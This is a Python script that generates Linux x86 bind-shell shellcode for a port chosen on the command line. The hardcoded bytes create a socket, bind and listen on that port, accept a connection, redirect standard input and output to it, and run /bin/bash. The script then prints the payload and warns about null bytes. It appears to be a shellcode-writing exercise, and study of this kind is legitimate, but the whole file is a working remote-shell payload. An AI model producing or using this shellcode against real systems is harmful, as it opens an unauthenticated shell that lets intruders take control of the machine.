#!/usr/bin/python

import socket
import sys

shellcode =  '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01'
shellcode += '\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x11\\x5c\\x66'
shellcode += '\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80'
shellcode += '\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52'
shellcode += '\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49'
shellcode += '\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f'
shellcode += '\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9'
shellcode += '\\x31\\xd2\\xcd\\x80'

if len(sys.argv) < 2:
	print('Usage: {name} [port]'.format(name = sys.argv[0]))
	exit(1)

port = sys.argv[1]
port_htons = hex(socket.htons(int(port)))

byte1 = port_htons[4:]
if byte1 == '':
	byte1 = '0'
byte2 = port_htons[2:4]
shellcode = shellcode.replace('\\x11\\x5c', '\\x{}\\x{}'.format(byte1, byte2))

print('Here\'s the shellcode using port {port}:'.format(port = port))
print(shellcode)

if '\\x0\\' in shellcode:
	print('##################################')
	print('Warning: Null byte in shellcode!')
	print('##################################')
